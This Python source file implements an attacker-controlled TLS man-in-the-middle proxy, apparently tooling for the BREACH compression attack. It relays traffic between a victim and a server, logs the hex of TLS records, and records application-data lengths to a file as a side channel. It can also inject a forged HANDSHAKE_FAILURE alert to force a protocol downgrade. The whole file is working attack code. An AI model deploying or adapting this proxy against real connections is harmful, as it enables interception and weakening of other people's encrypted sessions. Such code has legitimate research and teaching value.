import socket
import select
import logging
import constants
import binascii

# Logger setup
logging.basicConfig(filename="breach.log") # Log in file
# logging.basicConfig()
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

# Counters for defragmentation
past_bytes_user = 0 # Number of bytes expanding to future user packets
past_bytes_endpoint = 0 # Number of bytes expanding to future endpoint packets

# Print hexadecimal and ASCII representation of data
def log_data(data):
    pad = 0
    output = []
    buff = "" # Buffer of 16 chars

    for i in xrange(0, len(data), constants.LOG_BUFFER):
            buff = data[i:i+constants.LOG_BUFFER]
            hex = binascii.hexlify(buff) # Hex representation of data
            pad = 32 - len(hex)
            txt = "" # ASCII representation of data
            for ch in buff:
                if ord(ch)>126 or ord(ch)<33:
                        txt = txt + "."
                else:
                        txt = txt + chr(ord(ch))
            output.append("%2d\t %s%s\t %s" % (i, hex, pad*" ", txt))

    return "\n".join(output)

# Parse data and print header information and payload
def parse(data, past_bytes_endpoint, past_bytes_user, is_response = False):
    lg = ["\n"]
    downgrade = False
    
    # Check if there are any remaining bytes from previous endpoint record
    if past_bytes_endpoint:
        if is_response:
            lg.append("Data from previous TLS record: Endpoint\n")
            if past_bytes_endpoint >= len(data):
                lg.append(log_data(data))
                lg.append("\n")
                past_bytes_endpoint = past_bytes_endpoint - len(data)
                return ("\n".join(lg), past_bytes_endpoint, past_bytes_user, downgrade)
            else:
                lg.append(log_data(data[0:past_bytes_endpoint]))
                lg.append("\n")
                data = data[past_bytes_endpoint:]
                past_bytes_endpoint = 0
    # Same check for user record
    if past_bytes_user:
       if not is_response:
           lg.append("Data from previous TLS record: User\n")
           if past_bytes_user >= len(data):
               lg.append(log_data(data))
               lg.append("\n")
               past_bytes_user = past_bytes_user - len(data)
               return ("\n".join(lg), past_bytes_endpoint, past_bytes_user, downgrade)
           else:
               lg.append(log_data(data[0:past_bytes_user]))
               lg.append("\n")
               data = data[past_bytes_user:]
               past_bytes_user = 0

    try:
        cont_type = ord(data[constants.TLS_CONTENT_TYPE])
        version = (ord(data[constants.TLS_VERSION_MAJOR]), ord(data[constants.TLS_VERSION_MINOR]))
        length = 256*ord(data[constants.TLS_LENGTH_MAJOR]) + ord(data[constants.TLS_LENGTH_MINOR])
    except Exception as exc:
        logger.error("Only %d remaining for next record, not enough for valid TLS header" % len(data))
        logger.error(exc)
        if is_response:
            return ("", 0, past_bytes_user, downgrade)
        else:
            return ("", past_bytes_endpoint, 0, downgrade)
 
    if is_response:
            if cont_type in constants.TLS_CONTENT:
                    print("Endpoint %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
                    if cont_type == 23:
                            with open('out.out', 'a') as f:
                                f.write("Endpoint application payload: %d\n" % length)
                                f.close()
            else:
                    print("Unassigned Content Type record (len = %d)" % len(data))
            lg.append("Source : Endpoint")
    else:
            if cont_type in constants.TLS_CONTENT:
                    print("User %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
                    if cont_type == 22:
                            if ord(data[constants.MAX_TLS_POSITION]) > constants.MAX_TLS_ALLOWED:
                                downgrade = True
                    if cont_type == 23:
                            with open('out.out', 'a') as f:
                                f.write("User application payload: %d\n" % length)
                                f.close()
            else:
                    print("Unassigned Content Type record (len = %d)" % len(data))
            lg.append("Source : User")

    try:
        lg.append("Content Type : " + constants.TLS_CONTENT[cont_type])
    except:
        lg.append("Content Type: Unassigned %d" % cont_type)
    try:
        lg.append("TLS Version : " + constants.TLS_VERSION[(version[0], version[1])])
    except:
        lg.append("TLS Version: Uknown %d %d" % (version[0], version[1]))
    lg.append("TLS Payload Length: %d" % length)
    lg.append("(Remaining) Packet Data length: %d\n" % len(data))
    
    # Check if TLS record spans to next TCP segment
    if len(data) < length:
        if is_response:
            past_bytes_endpoint = length + constants.TLS_HEADER_LENGTH - len(data)
        else:
            past_bytes_user = length + constants.TLS_HEADER_LENGTH - len(data)

    lg.append(log_data(data[0:constants.TLS_HEADER_LENGTH]))
    lg.append(log_data(data[constants.TLS_HEADER_LENGTH:constants.TLS_HEADER_LENGTH+length]))
    lg.append("\n")
    
    # Check if packet has more than one TLS records
    if length < len(data) - constants.TLS_HEADER_LENGTH and len(data[constants.TLS_HEADER_LENGTH+length:]) > 0:
        more_records, past_bytes_endpoint, past_bytes_user, _ = parse(
                                                                      data[constants.TLS_HEADER_LENGTH+length:], 
                                                                      past_bytes_endpoint, 
                                                                      past_bytes_user, 
                                                                      is_response
                                                                  )
        lg.append(more_records)

    return ("\n".join(lg), past_bytes_endpoint, past_bytes_user, downgrade)

# Start sockets on user side (proxy as server) and endpoint side (proxy as client)
def start():
    logger.info("Starting Proxy")

    user_setup()
    endpoint_setup()

    logger.info("Proxy is set up")

# Restart sockets in case of error
def restart():
    logger.info("Restarting Proxy")

    try:
        user_socket.close()
        endpoint_socket.close()
    except:
        pass

    user_setup()
    endpoint_setup()

    logger.info("Proxy has restarted")

# Create and configure user side socket
def user_setup():
    global user_socket, user_connection, address

    logger.info("Setting up user socket")
    user_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    user_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Set options to reuse socket
    user_socket.bind((constants.USER, constants.USER_PORT))
    logger.info("User socket bind complete")
    user_socket.listen(1)
    logger.info("User socket listen complete")
    user_connection, address = user_socket.accept()
    logger.info("User socket is set up")

# Create and configure endpoint side socket
def endpoint_setup():
    global endpoint_socket

    logger.info("Setting up endpoint socket")
    endpoint_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    logger.info("Connecting endpoint socket")
    endpoint_socket.connect((constants.ENDPOINT, constants.ENDPOINT_PORT))
    endpoint_socket.setblocking(0) # Set non-blocking, i.e. raise exception if send/recv is not completed
    logger.info("Endpoint socket is set up")

# Start proxy and execute main loop
start()
logger.info("Starting main proxy loop")
while 1:
    ready_to_read, ready_to_write, in_error = select.select(
                                                            [user_connection, endpoint_socket], 
                                                            [], 
                                                            [], 
                                                            5
                                                           )

    if user_connection in ready_to_read: # If user side socket is ready to read...
            data = ""

            try:
                data = user_connection.recv(constants.SOCKET_BUFFER) # ...receive data from user...
            except Exception as exc:
                logger.error("User connection error")
                logger.error(exc)
                restart()

            if len(data) == 0:
                    logger.info("User connection closed")
                    restart()
            else:
                    print("User Packet Length: %d" % len(data))
                    output, past_bytes_endpoint, past_bytes_user, downgrade = parse(
                                                                                    data, 
                                                                                    past_bytes_endpoint, 
                                                                                    past_bytes_user 
                                                                                   ) # ...parse it...
                    logger.debug(output)
                    try:
                        if downgrade and constants.ATTEMPT_DOWNGRADE:
                                alert = 'HANDSHAKE_FAILURE'
                                output, _, _, _ = parse(
                                                    constants.ALERT_MESSAGES[alert],
                                                    past_bytes_endpoint,
                                                    past_bytes_user,
                                                    True
                                                   )
                                logger.debug("\n\n" + "Downgrade Attempt" + output)
                                user_connection.sendall(constants.ALERT_MESSAGES[alert]) # if we are trying to downgrade, send fatal alert to user
                                continue
                        endpoint_socket.sendall(data) # ...and send it to endpoint
                    except Exception as exc:
                        logger.error("User data forwarding error")
                        logger.error(exc)
                        restart()

    if endpoint_socket in ready_to_read: # Same for the endpoint side
            data = ""

            try:
                data = endpoint_socket.recv(constants.SOCKET_BUFFER)
            except Exception as exc:
                logger.error("Endpoint connection error")
                logger.error(exc)
                restart()

            if len(data) == 0:
                    logger.info("Endpoint connection closed")
                    restart()
            else:
                    print("Endpoint Packet Length: %d" % len(data))
                    output, past_bytes_endpoint, past_bytes_user, _ = parse(
                                                                         data, 
                                                                         past_bytes_endpoint, 
                                                                         past_bytes_user,
                                                                         True
                                                                        )
                    logger.debug(output)
                    try:
                        user_connection.sendall(data)
                    except Exception as exc:
                        logger.error("Endpoint data forwarding error")
                        logger.error(exc)
                        restart()

# Close sockets to terminate connection
user_connection.close()
endpoint_socket.close()
logger.info("Connection closed")
